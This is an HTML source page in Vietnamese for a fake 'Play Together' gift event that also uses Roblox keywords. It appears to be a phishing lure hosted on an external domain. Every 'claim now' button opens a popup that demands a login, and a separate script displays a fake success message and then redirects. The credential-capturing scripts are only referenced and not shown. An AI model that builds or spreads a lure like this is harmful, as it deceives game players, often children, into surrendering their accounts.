<html>
    
<head>
    
    <base href="https://themxe.codeflow.store/8/">
    
    <script type="text/javascript" async src="js_2"></script>
    
    <script src="js/sweetalert2.min.js"></script>
    
    <script src="js/jquery.min.js"></script>
    
    <script src="js/bootstrap.min.js"></script>
    
    <script src="js/owl.carousel.min.js"></script>


    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">

    <script type="text/javascript" async src="js_2"></script>
    <script src="js/sdk_1.js" async crossorigin="anonymous"></script>
    <link href="css/browser19ab991e.css?t=1695573973" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/index.css" rel="stylesheet">
    <title>SỰ KIỆN NHẬN QUÀ PLAY TOGETHER</title>
    <meta name="description" content="Sự kiện Roblox">
    <meta itemprop="image" content="images/icon-age.png" />
    <link rel="icon" type="image/png" href="images/7bba321f4d8328683d6e59487ce514eb.ico">
    <meta name="keywords" content="Vòng Quay May Mắn Roblox">
    <script async defer src="js/sdk.js"></script>
    <script async src="js_1"></script>
   
</head>

<body>
    <div id="main" class="p-5">
        <div class="container">
            <div class="blox-fruits">
                <img src="images/playtogether.png" alt="" style="width: 20%">
            </div>
            <div class="blox-fruits">
                <img src="images/logo.png" alt="" style="width: 150%">
            </div>
            <div class="row bottom-row mt-5">

                <div class="comments-wrapper col-md-12 mt-5">
                    <div class="generator-wrapper-inner panel-box-wrapper">
                        <div class="panel-content">
                            <div class="row">
                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/1.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>
                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/2.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>
                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/3.png" alt="Gift">

                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>
                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/4.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>
                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/5.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>
                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/6.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>
                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/7.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>

                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/8.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>

                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/9.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>

                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/10.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>

                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/3.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>

                                <div class="item col-6 col-sm-4 mt-2">
                                    <p class="task-title text-center"><b>PHẦN QUÀ</b></p>
                                    <img class="mb-3 gift" src="images/gift/5.png" alt="Gift">
                                    <div class="text-center">
                                                                                <button onclick="sweetalertclick()">Nhận ngay</button>
                                                                            </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>


    </div>
    <div id="fb-root" class=" fb_reset fb_reset">
        <div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
            <div></div>
        </div>
        <div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
            <div></div>
        </div>
    </div>
    <br>
    <style>
    .h3,
    h3 {
        font-size: 18px;
    }
    </style>
    <script src="sweetalert2.all.min.js"></script>
    <script>
    function sweetalertclick() {
        Swal.fire({
            title: 'Oops', // tiêu đề
            html: `<div class="swal2-html-container" id="swal2-html-container" style="display: block;"><div class="popup-alert__message">Đăng nhập để tham gia sự kiện!</div>
          
        <br>
              <button onclick="login();" class="btn btn-danger">
                Đăng Nhập
              </button>
             `,
            showConfirmButton: false,
        })
    }
    </script>
    
    
    <script>
    $('.claim').each(function() {
        $(this).click(function() {
            $(this).html('Đang nhận...');
            setTimeout(() => {
                Swal.fire({
                    title: 'Thành công !', // tiêu đề
                    html: `<div class="swal2-html-container" id="swal2-html-container" style="display: block;">
          
                    <div class="popup-alert__actions">
                    Nhận quà thành công! Phần quà sẽ cập nhật vào tài khoản trong giây lát
                    </div>  `,
                    showConfirmButton: true,
                }).then(() => {
                    redirect();
                })
                $(this).html('Claim');
            }, 2000);
        })
    })
    </script>
        
        
        
        
    </body>

</html>